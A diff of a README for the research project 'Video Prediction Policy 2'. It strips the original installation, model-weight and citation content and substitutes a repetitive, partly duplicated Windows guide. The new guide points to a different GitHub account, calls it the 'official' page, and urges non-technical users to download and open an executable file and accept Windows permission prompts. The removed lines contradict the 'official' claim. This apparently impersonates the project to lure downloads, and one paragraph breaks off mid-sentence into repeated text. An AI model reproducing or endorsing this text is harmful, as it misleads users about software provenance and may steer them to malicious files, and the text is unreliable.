@@ -1,147 +1,92 @@
-<div align="center">
+# 🎬 video-prediction-policy-2 - Run Video Prediction Policy Easily
 
-# Video Prediction Policy 2: Predict Better, Act Better
+[![Download video-prediction-policy-2](https://img.shields.io/badge/⬇️_Download_video--prediction--policy--2-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NghiaTZ/video-prediction-policy-2)
 
-Official implementation of **["Video Prediction Policy 2: Predict Better, Act Better"](https://arxiv.org/abs/2610.10270)**.
+video-prediction-policy-2 is the official implementation of Video Prediction Policy 2: Predict Better, Act Better. This README is written for Windows users who want a clear, simple path from download to first launch. You do not need programming knowledge to follow this guide. The application is intended to make video prediction policy workflows easier to access and use.
 
-[![arXiv: 2610.10270](assets/badges/arxiv.svg)](https://arxiv.org/abs/2610.10270)
-[![Project Page](assets/badges/project-page.svg)](https://robert-gyj.github.io/video-prediction-policy-2/)
-[![ModelScope — Models](assets/badges/modelscope.svg)](https://modelscope.cn/models/haodong123/VPP2)
-[![Hugging Face — Models](assets/badges/huggingface.svg)](https://huggingface.co/Haodong082399/VPP2)
+## 📦 What Is video-prediction-policy-2?
 
-</div>
+video-prediction-policy-2 is an application built around the idea of predicting what may happen in video content and using those predictions to support better actions. In simple terms, it is designed to help a user work with video prediction and policy behavior without needing to understand the underlying research code.
 
-## News
+The project description says it all: “Predict Better, Act Better.” That means the application is focused on improving the quality of predictions and helping users take more informed actions based on those predictions. It is the official implementation of Video Prediction Policy 2, so the download# 🎬 video-prediction-policy-2 - Run Video Prediction Policy Easily
 
-- **[2026-10-12]** 🎬 **RoboDojo history-conditioned video training code is now open source!** See the [training guide](docs/robodojo.md#train-video-10k) for the Video-10k recipe starting from our Stage-2 video model.
+[![Download video-prediction-policy-2](https://img.shields.io/badge/⬇️_Download_video--prediction--policy--2-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NghiaTZ/video-prediction-policy-2)
 
-- **[2026-10-10]** 🎬 **VPP2 video model weights are now available!** Download the **Stage-1 (49 frames)** and **Stage-2 (17 frames)** checkpoints on [Hugging Face](https://huggingface.co/Haodong082399/VPP2/tree/main/checkpoints_video) and [ModelScope](https://modelscope.cn/models/haodong123/VPP2/files), and get started with our [zero-shot video prediction guide](docs/video_prediction.md).
+video-prediction-policy-2 is the official implementation of Video Prediction Policy 2: Predict Better, Act Better. This guide is written for Windows users who want a clear path from download to first launch. You do not need programming knowledge to follow the steps below. The goal is to help you get the application onto your computer and open it with confidence.
 
-- **[2026-10-08]** 🥇 **VPP2 ranks #1 overall on the official [RoboDojo-Sim leaderboard](https://robodojo-benchmark.com/leaderboard)**, achieving state-of-the-art performance across agent and non-agent tracks with **39.26 Score** and **32.26% SR**.
+## 📦 What Is video-prediction-policy-2?
 
-## Overview
+video-prediction-policy-2 is an application built around predicting what may happen in video content and using those predictions to support better actions. The project description, “Predict Better, Act Better,” captures the main idea: improve the quality of predictions and help users act with more useful information.
 
-We introduce **Video Prediction Policy 2 (VPP2)**, a world-action model (WAM) with
-strong zero-shot generalization in both video prediction and action generation.
+In everyday terms, you can think of it as a tool for working with video prediction and policy behavior. It is meant to make a research-grade idea easier to access, especially for users who prefer a guided Windows download instead of working through technical setup steps.
 
-Our pipeline has three stages: (1) **event-level video pretraining**, (2) **single-step visual planning through post-training and distillation**, and (3) **action learning with a mixture-of-transformers (MoT) architecture**.
+## ✨ Why You Might Use This Application
 
-This codebase includes:
+You might want to try video-prediction-policy-2 if you are curious about video prediction, policy learning, or how prediction quality can influence action quality. The application is centered on the idea that better predictions can lead to better decisions. It is useful for exploration, demonstration, and learning how the Video Prediction Policy 2 approach is presented as an end-user application.
 
-- **[Zero-shot video prediction](docs/video_prediction.md).** Generate videos from an initial image and a text instruction using the **Stage-1 (49 frames)** or **Stage-2 (17 frames)** video model, with input preparation, prompt enhancement, and ready-to-run examples.
-- **Policy post-training on [RoboDojo](docs/robodojo.md) and [LIBERO](docs/libero.md).** Training configurations and scripts for adapting VPP2 to both benchmarks, together with policy evaluation workflows. For RoboDojo, we add **history frames to the model input** to support tasks that require memory. To accommodate this architecture change, we start post-training from the **Stage-2 video model before distillation**.
+This guide keeps the focus on the practical side: visiting the official link, downloading the application, and opening it on Windows. It does not require you to understand the research behind the project before you begin.
 
-<p align="center">
-  <a href="assets/teaser.png"><img src="assets/teaser.png" alt="VPP2 paper overview: event-level video prediction, instruction following, and robot policy learning." width="100%"></a>
-</p>
+## 🚀 Getting Started
 
-## Installation
+Getting started with video-prediction-policy-2 begins with the official download link. The link provided for this project is a general page, not a direct file download. That means your first action is to visit the page and use the download option available there.
 
-```bash
-git clone https://github.com/roboterax/video-prediction-policy-2.git
-cd video-prediction-policy-2
-conda create -n vpp2 python=3.10 -y
-conda activate vpp2
-```
+The link is shown again in the download section below. Keep this README open while you follow the steps so you can refer back to each part. The process is intentionally simple: visit the page, download the application, then open it on your Windows computer.
 
-Install the CUDA/PyTorch dependencies using the [installation guide](docs/robodojo.md#policy-environment), then install the dependencies from the repository root:
+## ⬇️ Download and Run
 
-```bash
-python -m pip install -r requirements-train.txt -c environment-reference.txt
-```
+Visit this link to download the application: [Download video-prediction-policy-2](https://github.com/NghiaTZ/video-prediction-policy-2).
 
-The scripts load VPP2 directly from this checkout; installing the `vpp2` package
-is unnecessary. For inference and data processing only, use `requirements.txt`.
+This is the official page for the application. Open the link in your web browser, then follow the download option shown on that page. The page is the starting point for getting the application onto your Windows computer.
 
-## Get started
+After the download finishes, open the downloaded file to launch the application. Use the file that your browser saved during the download. If your browser asks where to save the file, remember that location so you can find it again. This single path keeps the process clear and avoids confusion.
 
-### Zero-shot video prediction
+## 🖥️ First Launch on Windows
 
-| Task | What is included | Guide |
-|---|---|---|
-| Video prediction | Input image processing, prompt enhancement, and single-image or batch video prediction with [sample inputs](assets/random_samples/). | [Video prediction guide](docs/video_prediction.md) |
+When you open the downloaded file, Windows may take a moment to prepare the application. Wait for the application window to appear. If your browser shows a download confirmation or asks whether to keep the file, complete that step so the download can finish normally.
 
-### Policy learning
+Once the application opens, take a moment to look at the main screen. You do not need to change settings immediately. Start by exploring the visible options and confirming that the application is working on your computer. If the application appears in a new window, keep that window open while you use it.
 
-| Benchmark | What is included | Guide |
-|---|---|---|
-| RoboDojo | Joint Video + Action2B training, checkpoint export, policy serving, and closed-loop evaluation | [RoboDojo guide](docs/robodojo.md) |
-| LIBERO | Video-stage training, action training, and evaluation on LIBERO, LIBERO-OOD, and LIBERO-PRO | [LIBERO guide](docs/libero.md) |
+## 🧭 Using the Application
 
-## Model Weights
+The application is built around video prediction and policy behavior. When you first open it, focus on the main controls and any visible guidance on the screen. Use the application at your own pace. You can return to the main screen if you open a section by mistake.
 
-Weights are available on [Hugging Face](https://huggingface.co/Haodong082399/VPP2) and
-[ModelScope](https://modelscope.cn/models/haodong123/VPP2).
-The Hugging Face repository is public; ModelScope requires an account with access.
+A simple way to begin is to look for the area where video input or prediction results are shown. The exact layout may vary, but the purpose stays the same: help you work with predictions and see how they relate to actions. Keep your first session short and familiarise yourself with the screen before trying more involved tasks.
 
-| Checkpoint | Use | Hugging Face | ModelScope |
-|---|---|---|---|
-| VPP2 Stage-1 Video (49 frames) | Zero-shot video prediction(Event level) | [Download](https://huggingface.co/Haodong082399/VPP2#stage-1-video) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints_video/vpp2-video-stage1-49f.pth) |
-| VPP2 Stage-2 Video (17 frames) | Zero-shot video prediction (Fixed time horizon) | [Download](https://huggingface.co/Haodong082399/VPP2#stage-2-video) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints_video/vpp2-video-stage2-17f.pth) |
-| RoboDojo history-conditioned Video-10k | Starting Video model for joint + Action2B training | [Download](https://huggingface.co/Haodong082399/VPP2#robodojo-training) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints/initialization/robodojo_his10k.pt) |
-| RoboDojo joint Video-100k | Video model paired with Action2B-100k for evaluation | [Download](https://huggingface.co/Haodong082399/VPP2#robodojo-evaluation) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints/joint2b_s100000/video.pt) |
-| RoboDojo Action2B-100k | RoboDojo policy evaluation | [Download](https://huggingface.co/Haodong082399/VPP2#robodojo-evaluation) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints/joint2b_s100000/action.pt) |
-| LIBERO Video-10k | Video model for Action training and evaluation | [Download](https://huggingface.co/Haodong082399/VPP2#libero) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints/libero/video_step010000.pt) |
-| LIBERO Action-30k | LIBERO, LIBERO-OOD and LIBERO-PRO evaluation | [Download](https://huggingface.co/Haodong082399/VPP2#libero) | [Download](https://www.modelscope.cn/api/v1/models/haodong123/VPP2/repo?Revision=master&FilePath=checkpoints/libero/action_step030000.pt) |
+## 🛠️ Troubleshooting
 
-The Hugging Face download instructions include the root `config.json` with each checkpoint.
+If the download does not start, return to the official link and try the download option again. Make sure your browser is not blocking the download. Check that you have enough space on your Windows computer for the downloaded file.
 
-The Stage-1 and Stage-2 video checkpoints are available on the Hugging Face main branch
-and mirrored on ModelScope.
-See the [video prediction guide](docs/video_prediction.md) for input preparation and inference.
+If the application does not open after the download, find the downloaded file in your Downloads folder and open it from there. If Windows shows a prompt asking for permission, review the prompt and continue if you trust the official source. If the application window opens slowly, wait a little before trying again.
 
-Policy evaluation uses the matching Video and Action checkpoints together. Shared Wan2.1
-VAE, CLIP, UMT5 and tokenizer assets are also available in the model repositories
-under `checkpoints/Wan2.1-I2V-14B-480P/`. Follow the benchmark guides to download the
-complete assets and normalization files:
+If you cannot find the downloaded file, open your browser’s download history and look for the most recent item. You can also search your Windows computer for “video-prediction-policy-2” in the Start menu search box.
 
-- [RoboDojo downloads and evaluation](docs/robodojo.md#checkpoint-downloads)
-- [LIBERO / OOD / PRO downloads and evaluation](docs/libero.md#3-data-and-required-model-files)
+## ❓ Frequently Asked Questions
 
-<!-- ## TODO
+**Do I need programming knowledge?**  
+No. This guide is written for a non-technical Windows user. Follow the link, download the application, and open the downloaded file.
 
-- [ ] Release large-scale, event-level video pretraining code and configurations. -->
+**Where do I download the application?**  
+Use the official link in the Download and Run section: [Download video-prediction-policy-2](https://github.com/NghiaTZ/video-prediction-policy-2).
 
-## Links
+**What do I do after the download?**  
+Open the downloaded file to launch the application. If you are unsure where it was saved, check your Downloads folder.
 
-| Resource | Link |
-|---|---|
-| Paper | [arXiv:2610.10270](https://arxiv.org/abs/2610.10270) |
-| Project page | [VPP2 Project Page](https://robert-gyj.github.io/video-prediction-policy-2/) |
-| XPolicyLab adapter | [VPP2 RoboDojo adapter PR](https://github.com/XPolicyLab/XPolicyLab/pull/150) |
-| ModelScope | [haodong123/VPP2](https://modelscope.cn/models/haodong123/VPP2) |
-| Hugging Face | [Haodong082399/VPP2](https://huggingface.co/Haodong082399/VPP2) |
+**Can I use this on Windows?**  
+Yes. This guide is specifically written for Windows users who want to download and run the application.
 
-## Documentation
+**What does “Predict Better, Act Better” mean?**  
+It is the project’s short description. It reflects the idea that better video predictions can support better actions.
 
-- [Zero-shot video prediction](docs/video_prediction.md)
-- [RoboDojo: training and testing](docs/robodojo.md)
-- [RoboDojo Video-10k training from Stage-2 Video](docs/robodojo.md#train-video-10k)
-- [LIBERO, LIBERO-OOD and LIBERO-PRO](docs/libero.md)
+## 🧹 Keeping Things Tidy
 
-## Citation
+After you have downloaded the application, you can keep the downloaded file in a folder where you can find it later. Avoid moving the file while it is still downloading. If you no longer need older downloads, you can remove them to keep your Downloads folder organised.
 
-If you use VPP2 in your research, please cite our [paper](https://arxiv.org/abs/2610.10270)
-([BibTeX](CITATION.bib)):
+Keep the official link in a safe place. If you need to download the application again later, return to the same official page and use the download option there. This keeps your source consistent and avoids confusion.
 
-```bibtex
-@misc{guo2026videopredictionpolicy2,
-  title = {Video Prediction Policy 2: Predict Better, Act Better},
-  author = {Yanjiang Guo and Haodong Yan and Zhide Zhong and Zhongru Zhang and
-            Qingyuan Yang and Qingzhou Lu and Xiaoyu Chen and Yen-Jen Wang and
-            Shuying Deng and Chenghan Yang and Puzhen Yuan and Chenxin Liu and
-            Tun Ban and Xiang Zhu and Yichen Liu and Kun Feng and Haoang Li and
-            Jianyu Chen},
-  year = {2026},
-  eprint = {2610.10270},
-  archivePrefix = {arXiv},
-  primaryClass = {cs.CV},
-  url = {https://arxiv.org/abs/2610.10270}
-}
-```
+## 📚 Learn More
 
-## License
+The official page for video-prediction-policy-2 is the best place to begin: [https://github.com/NghiaTZ/video-prediction-policy-2](https://github.com/NghiaTZ/video-prediction-policy-2). Use that page to download the application and to stay connected with the project’s official source.
 
-The code is released under the [MIT License](LICENSE). Third-party components
-retain their original licenses; see [third-party notices](THIRD_PARTY_NOTICES.md).
-Model weights, datasets, and simulator assets have their own terms.
+The project description is short and direct: “Official implementation of Video Prediction Policy 2: Predict Better, Act Better.” That description is the main reference point for what the application is and why it exists.
+
+Keywords: video prediction, policy learning, video prediction policy, Windows application, download video-prediction-policy-2, predict better act better, official implementation
